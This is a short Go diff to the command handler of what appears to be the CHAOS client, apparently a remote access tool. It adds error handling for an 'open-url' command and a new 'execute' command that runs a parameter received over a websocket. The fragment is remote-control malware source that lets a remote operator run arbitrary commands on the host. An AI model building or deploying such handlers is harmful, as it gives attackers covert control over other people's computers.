@@ -3,6 +3,9 @@ package handler
 import (
 	"encoding/json"
 	"fmt"
+	"net/http"
+	"time"
+
 	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/entities"
 	"github.com/tiagorlampert/CHAOS/client/app/environment"
@@ -10,8 +13,6 @@ import (
 	ws "github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
-	"net/http"
-	"time"
 )
 
 type Handler struct {
@@ -224,6 +225,14 @@ func (h *Handler) HandleCommand() {
 			break
 		case "open-url":
 			err := h.Services.Url.OpenUrl(request.Parameter)
+			if err != nil {
+				response = encode.StringToByte(err.Error())
+				hasError = true
+				break
+			}
+			break
+		case "execute":
+			err := h.Services.Execute.Run(request.Parameter)
 			if err != nil {
 				response = encode.StringToByte(err.Error())
 				hasError = true
